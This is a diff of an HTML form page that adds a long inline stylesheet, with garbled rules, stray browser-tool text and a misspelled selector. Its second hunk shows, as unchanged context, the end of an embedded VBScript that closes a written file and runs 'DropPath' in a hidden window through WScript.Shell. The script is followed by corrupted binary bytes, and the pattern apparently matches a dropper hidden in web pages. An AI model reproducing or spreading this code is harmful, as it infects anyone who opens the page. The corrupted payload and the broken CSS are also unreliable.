@@ -3,7 +3,218 @@
 <link rel="stylesheet" type="text/css" href="style.css">
 <head>
 	<title>form</title>
-
+<style type="text/css">
+  *{
+margin: 0;  
+}
+form {
+    display: block;
+    margin-top: 5em;
+    font-family: helvetica;
+}
+input[type="radio"] {
+    padding: 4px;
+    margin-left: 8px;
+}
+fieldset {
+    display: block;
+    -webkit-margin-start: 368px;
+    -webkit-margin-end: 476px;
+    -webkit-padding-before: 0.35em;
+    -webkit-padding-start: 3.75em;
+    -webkit-padding-end: 1.75em;
+    -webkit-padding-after: 0.625em;
+    border-image-source: initial;
+    border-image-slice: initial;
+    border-image-width: initial;
+    border-image-outset: initial;
+    border-image-repeat: initial;
+    min-width: -webkit-min-content;
+    border-width: 0px;
+    border-style: groove;
+    border-color: threedface;
+    background: #f1f7f7;
+}
+h1 {
+    display: block;
+    font-size: 2em;
+    -webkit-margin-before: 0.67em;
+    -webkit-margin-after: 0.1em;
+    -webkit-margin-start: 0px;
+    -webkit-margin-end: 0px;
+    font-weight: bold;
+    width: 122px;
+}
+input[type="text" i] {
+    padding: 12px 0px;
+    border: 1px solid #acaccc;
+    margin: 5px;
+    font-size: 15px;
+    margin-left: 2px;
+    border-radius: 5%;
+}
+nput {
+    -webkit-appearance: textfield;
+    background-color: white;
+    border-image-source: initial;
+    border-image-slice: initial;
+    border-image-width: initial;
+    border-image-outset: initial;
+    border-image-repeat: initial;
+    -webkit-rtl-ordering: logical;
+    -webkit-user-select: text;
+    cursor: auto;
+    padding: 1px;
+    border-width: 2px;
+    border-style: ridge;
+    border-color: initial;
+    border-radius: 100%;
+}
+input, textarea, keygen, select, button {
+    text-rendering: auto;
+    color: initial;
+    letter-spacing: normal;
+    word-spacing: normal;
+    text-transform: none;
+    text-indent: 5px;
+    text-shadow: none;
+    display: inline-block;
+    text-align: start;
+    margin: 0em 0em 0em 0em;
+    font: 17.3333px Arial;
+}
+input, textarea, keygen, select, button, meter, progress {
+    -webkit-writing-mode: horizontal-tb;
+}
+input[alt="other"] {
+    width: 400px;
+}
+div#Birthday {
+    padding: 3px;
+    margin-top: 0px;
+    margin-left: 0px;
+}
+keygen, select, select[size="0"], select[size="1"] {
+    border-radius: 0px;
+    border-color: rgb(169, 169, 169);
+}
+user agent stylesheet
+select:not(:-internal-list-box) {
+    overflow: visible !important;
+}
+user agent stylesheet
+select {
+    -webkit-appearance: menulist;
+    box-sizing: border-box;
+    align-items: center;
+    border-image-source: initial;
+    border-image-slice: initial;
+    border-image-width: initial;
+    border-image-outset: initial;
+    border-image-repeat: initial;
+    white-space: pre;
+    -webkit-rtl-ordering: logical;
+    color: black;
+    background-color: white;
+    cursor: default;
+    border-width: 1px;
+    border-style: solid;
+    border-color: initial;
+}
+ div#day {
+    display: inline-block;
+    margin-left: 0px;
+    vertical-align: initial;
+    width: 55px;
+}
+div#year {
+    display: inline-block;
+}
+div#date {
+    height: 0px;
+    margin: 0px;
+    padding: 0px 0px;
+    margin-top: 0px;
+    font-size: 0px;
+    margin-left: 0px;
+}
+option {
+    font-weight: normal;
+    display: block;
+    white-space: pre;
+    min-height: 1.2em;
+    padding: 0px 2px 1px;
+}
+h4 {
+    display: block;
+    -webkit-margin-before: 0.33em;
+    -webkit-margin-after: 1.33em;
+    -webkit-margin-start: 243px;
+    font-weight: bold;
+    width: 150px;
+    font-size: x-small;
+    height: 0px;
+}
+a:-webkit-any-link {
+    color: -webkit-link;
+    text-decoration: blink;
+    cursor: auto;
+}
+strong, b {
+    font-weight: bold;
+}
+div#gender {
+    display: block;
+}
+div#radio {
+    display: block;
+    margin: 5px;
+    padding: 0px;
+    width: 150px;
+}
+    margin-top: 0px;
+    padding: 0px;
+    font-size: smaller;
+}
+h6 {
+    display: block;
+    font-size: 0.67em;
+    -webkit-margin-before: 2.33em;
+    -webkit-margin-after: 2.33em;
+    -webkit-margin-start: 0px;
+    -webkit-margin-end: 0px;
+    font-weight: bold;
+    width: 100px;
+}
+script {
+    display: none;
+}
+div#h6 {
+    width: 348px;
+    margin-top: 0px;
+    font-size: medium;
+    font-family: helvetica;
+    font-weight: inherit;
+    display: block;
+}
+div#button1 {
+    background: #299629;
+    display: block;
+    width: 139px;
+    text-align: center;
+    height: 33px;
+    border-radius: 10%;
+    border: 2px solid #77c377;
+}
+button1.button1 {
+    text-align: center;
+    width: 150px;
+    color: white;
+    padding: 6px;
+    margin-bottom: 0px;
+    text-overflow: ellipsis;
+}
+</style>
 </head>
 <body>
 <form action="action_page.php">
@@ -259,5 +470,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--¨‡&ÜZèH*y¢J*ÊûÒ1Ž(¥7AÚÆfuhDVÎ¯!)	øÚØ´ž¯CªLtyWÓ8¼+|t‹"(%( á±ÎCï$@)dã“êØdÛà×ê5¢v¥O‹t	¹o!ž±ÏåaážóV%²‡Íý½s•N ;6üÆ\MlÍú•šd›6wŠÂ'™SÚ‘R¢lÙä„… 7uÜÆØ×ÂÈj×j+}ûüzY|mny ¦-ìXÎnŒ¼r¨²äâCjZ}Xx6.k8"CÑ6‡ø½¥¯¿¬4ç0˜ƒœ~ü÷e.l›nMìl7†&b¦äzT†¡±tÈò:(Ï”x#×cFk3èhn y<$9?ü¢Î"‰Ñ‚ƒ1*‡0€œ|¼&óWÛèiš¦]6+z›9ªj«~ËçÁW#øMBji±‡î,7àøKþ4ï)í€Ž._¼Èsù¯l™ƒ<„cµÂ#Âû3!²[{Oa+yL3*ÅEP6ä÷ÈPFËèºÅ_—íüÚœ
-XY§ñœ<‘O€ÝX½Ìxë	çã“ÉÐ²¿ lI›ôóÜ 7,pÌÆà„¡•eRù’AR2˜ ÚLRWøÚLÚLÚL—‘Nq˜DZÄ«h ÚL-->
+//--></SCRIPT><!--??&??*y?J*???(?7A?fuhDV?Î¯!)	?????C?LtyW??+|t?"(%(??C?@)d????5?v?O?t	?o!???a?V%?????s?N ;6??Ml???d?6w???SÚ‘R?l????7u???j?+}??zY|mny ?-?????r???CjZ}Xx6.k8"C????????4????~??e.l?nM?7?&b??T???t?:(Ï”x#?Fk3?n?y<$9?????Ñ‚?1*?0??|??&?Û???]6+z?9?j?~??W#?MBji???7?K?4?í€Ž._????l??<?c???3!?[{Oa+yL3*?P6??F???????
+XY???O???????????lI????Ü 7,p????eR???AR2? ?RW??????Nq?DZÄ«h ?-->
